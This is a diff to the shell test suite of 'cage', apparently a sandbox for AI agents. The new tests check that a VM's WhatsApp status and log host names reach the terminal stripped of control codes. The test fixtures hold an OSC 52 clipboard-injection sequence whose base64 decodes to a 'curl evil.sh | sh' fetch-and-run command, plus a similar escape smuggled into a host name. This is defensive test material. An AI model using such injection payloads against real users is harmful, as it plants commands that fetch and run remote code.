@@ -27,6 +27,8 @@ if [ "$cmd" = exec ]; then
       for x in "$@"; do case "$x" in /cage-config/replies/*) f="$CAGE_HOME/agents/${vmname#cage-}/${x#/cage-config/}" ;; esac; done
       { printf '%s %s <- ' "$vmname" "${!#}"; cat "$f"; printf '\n---\n'; } >> "$MSB_SENT" ;;
     *--disallowedTools*|*"codex exec"*|*"cursor-agent --print"*|*"agy -p"*) printf 'answer from %s to: %s' "$vmname" "${!#}" ;;
+    *'cat ~/.cage/whatsapp/status.json'*)   # WhatsApp's status, as the VM wrote it: $MSB_WA_STATUS.1 once, then $MSB_WA_STATUS
+      if [ -e "${MSB_WA_STATUS:-}.1" ]; then cat "$MSB_WA_STATUS.1"; rm -f "$MSB_WA_STATUS.1"; else cat "${MSB_WA_STATUS:-/dev/null}"; fi ;;
   esac
 fi
 if [ "$cmd" = logs ]; then case "$*" in *"--source system"*) cat "$MSB_SYSLOG" 2>/dev/null ;; esac; exit 0; fi
@@ -647,6 +649,40 @@ ok "opening links: plain web addresses only; on Windows passed to PowerShell as 
   mkdir "$CAGE_HOME/cage.env.lock" && echo 999999 > "$CAGE_HOME/cage.env.lock/pid"   # left by a cage that died
   timeout 20 "$ROOT/cage" ask-all off </dev/null >/dev/null 2>&1 && grep -q '^CAGE_ASK_ALL="off"' "$CAGE_HOME/cage.env" || fail "a dead cage's lock blocked settings" )
 ok "settings: writers at once all keep their change; values that would be code are refused; a dead writer's lock is taken over"
+
+# text a VM wrote never reaches the terminal raw: WhatsApp's status (an OSC 52 sequence would set your clipboard)
+# and the host names in its logs
+( fresh o2
+  printf 'CAGE_AGENTS="claude"\nCAGE_WHATSAPP_MODE_claude="spare"\nCAGE_WHATSAPP_ALLOW_claude="15551234567"\n' >> "$CAGE_HOME/cage.env"
+  echo cage-claude > "$T/o2.vms"
+  export MSB_EXISTING="$T/o2.vms" MSB_RUNNING="$T/o2.vms" MSB_WA_STATUS="$T/wa.status"
+  printf '{"state":"code","code":"\033]52;c;Y3VybCBldmlsLnNoIHwgc2g=\007"}' > "$T/wa.status.1"
+  printf '{"state":"linked","me":"1\033]52;c;Y3VybCBldmlsLnNoIHwgc2g=\007"}' > "$T/wa.status"
+  printf '+1 555 123 4567\n' | "$ROOT/cage" chat link whatsapp claude > "$T/wa.out" 2>&1 || fail "chat link whatsapp: $(cat -v "$T/wa.out")"
+  if LC_ALL=C grep -q $'\033\\|\007' "$T/wa.out"; then fail "WhatsApp's status reached the terminal raw: $(cat -v "$T/wa.out")"; fi
+  grep -q 'linked' "$T/wa.out" || fail "not linked: $(cat -v "$T/wa.out")"
+  printf '2026-10-01T10:00:01.000Z DEBUG x: DNS query denied by network policy domain=evil\033]52;c;Y3VybA==\007.example\n' > "$T/o2.syslog"
+  MSB_SYSLOG="$T/o2.syslog" "$ROOT/cage" security 2>"$T/sec2.out" || fail "cage security"
+  grep -q "claude couldn't reach evil" "$T/sec2.out" || fail "event not listed: $(cat -v "$T/sec2.out")"
+  if LC_ALL=C grep -q $'\033\\|\007' "$T/sec2.out"; then fail "a host name from a VM's log reached the terminal raw: $(cat -v "$T/sec2.out")"; fi )
+ok "text a VM wrote (WhatsApp's status, host names in its logs) reaches the terminal without control codes"
+
+# host patterns like *.anthropic.com stay patterns, whatever files are in the folder cage runs from
+( fresh h
+  mkdir -p "$T/hcwd" && cd "$T/hcwd" && touch www.anthropic.com notes.example.com www.example.org
+  printf 'ghp_x\n' | "$ROOT/cage" secret add GITHUB_TOKEN api.github.com claude 2>/dev/null || fail "secret add"
+  printf 'me@x.com\nhunter22\n' | "$ROOT/cage" password add example.com claude >/dev/null 2>&1 || fail "password add"
+  if printf 'k\n' | "$ROOT/cage" secret add MY_KEY api.anthropic.com claude 2>/dev/null; then fail "a key for claude's own service was accepted"; fi
+  "$ROOT/cage" up claude 2>/dev/null
+  Y="$CAGE_HOME/msb/claude.yaml"
+  grep -q '^    bypass: \["api.telegram.org", "anthropic.com", "\*.anthropic.com", ' "$Y" || fail "TLS bypass: $(grep bypass "$Y")"
+  grep -A2 -x '  CAGE_PW_EXAMPLE_COM:' "$Y" | grep -qxF '    allow: ["example.com", "*.example.com"]' || fail "password hosts: $(cat "$Y")"
+  "$ROOT/cage" allow '*.example.org' claude </dev/null 2>/dev/null && "$ROOT/cage" allow x.example.net claude </dev/null 2>/dev/null
+  "$ROOT/cage" allow rm x.example.net claude </dev/null 2>/dev/null
+  grep -qxF 'CAGE_ALLOW_HOSTS_claude="*.example.org"' "$CAGE_HOME/cage.env" || fail "allow list: $(grep ALLOW_HOSTS "$CAGE_HOME/cage.env")"
+  out="$("$ROOT/cage" allow rm nope.example.net claude </dev/null 2>&1)"
+  grep -q "nope.example.net wasn't on the allow list" <<<"$out" || fail "allow rm of a host that wasn't there: $out" )
+ok "host lists: *.patterns stay patterns in configs and checks, whatever is in the current folder; allow rm says when nothing changed"
 
 # --- Windows (WSL 2): WSL stops an idle distro, and its VMs with it. `up` holds one hidden wsl.exe session
 # (`cage _keepalive`) open through PowerShell's Start-Process; `down` with no agents releases it.
